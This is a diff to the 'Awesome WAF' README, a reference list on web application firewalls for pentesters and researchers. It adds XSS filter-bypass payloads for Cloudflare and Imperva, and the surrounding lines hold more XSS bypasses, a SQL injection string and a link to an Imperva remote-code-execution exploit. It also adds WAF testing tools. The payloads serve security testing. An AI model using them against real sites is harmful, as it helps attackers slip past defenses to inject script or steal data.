@@ -1,5 +1,5 @@
 # Awesome WAF [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg "Awesome")](https://github.com/0xinfection/awesome-waf)
-> Everything awesome about web application firewalls (WAFs). 🔥
+> Everything about web application firewalls (WAFs). 🔥
 >
 > __Foreword:__ This was originally my own collection on WAFs. I am open-sourcing it in the hope that it will be useful for pentesters and researchers out there. You might want to keep this repo on a watch, since it will be updated regularly. "The community just learns from each other." __#SharingisCaring__
 
@@ -980,7 +980,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Immunify360
+            Imunify360
         </td>
         <td>
             <ul>
@@ -3335,6 +3335,10 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ``` 
 
 ### Cloudflare
+- [XSS Bypass](https://twitter.com/SalahHasoneh1/status/1281254703360344064) by [@@SalahHasoneh1](https://twitter.com/@SalahHasoneh1)
+```
+<svg onx=() onload=(confirm)(1)>
+```
 - [XSS Bypass](https://pastebin.com/i8Ans4d4) by [@c0d3g33k](https://twitter.com/c0d3g33k)
 ```
 <a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
@@ -3605,12 +3609,16 @@ amUserId=1 union select username,password,3,4 from users
 ```
 
 ### Imperva
-- [XSS Bypass](https://twitter.com/0xInfection/status/1212331839743873026) by [@0xInfection](https://twitter.com/0xinfection)
+- [XSS Bypass](https://twitter.com/0xInfection/status/1364622858090016777) by [@0xInfection](https://twitter.com/0xInfection)
+```html
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
 ```
+- [XSS Bypass](https://twitter.com/0xInfection/status/1212331839743873026) by [@0xInfection](https://twitter.com/0xinfection)
+```html
 <a69/onclick=write&lpar;&rpar;>pew
 ```
 - [XSS Bypass](https://twitter.com/_ugurercan/status/1188406765735632896) by [@ugurercan](https://twitter.com/_ugurercan)
-```
+```html
 <details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>
 ```
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
@@ -3849,9 +3857,11 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 - [IdentYwaf](https://github.com/stamparm/identywaf) - A blind WAF detection tool which utlises a unique method of identifying WAFs based upon previously collected fingerprints by [@stamparm](https://github.com/stamparm).
 
 ### Testing:
+- [GoTestWAF](https://github.com/wallarm/gotestwaf) - A tool to test a WAF's detection logic and bypasses from [@wallarm](https://github.com/wallarm).
 - [Lightbulb Framework](https://github.com/lightbulb-framework/lightbulb-framework) - A WAF testing suite written in Python.
 - [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
 - [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A WAF testing tool by [Imperva](https://imperva.com).
+- [Framework for Testing WAFs (FTW)](https://github.com/coreruleset/ftw) - A framework by the [OWASP CRS team](https://coreruleset.org/) that helps to provide rigorous tests for WAF rules by using the OWASP Core Ruleset V3 as a baseline.
 
 ### Evasion:  
 - [WAFNinja](https://github.com/khalilbijjou/wafninja) - A smart tool which fuzzes and can suggest bypasses for a given WAF by [@khalilbijjou](https://github.com/khalilbijjou/).
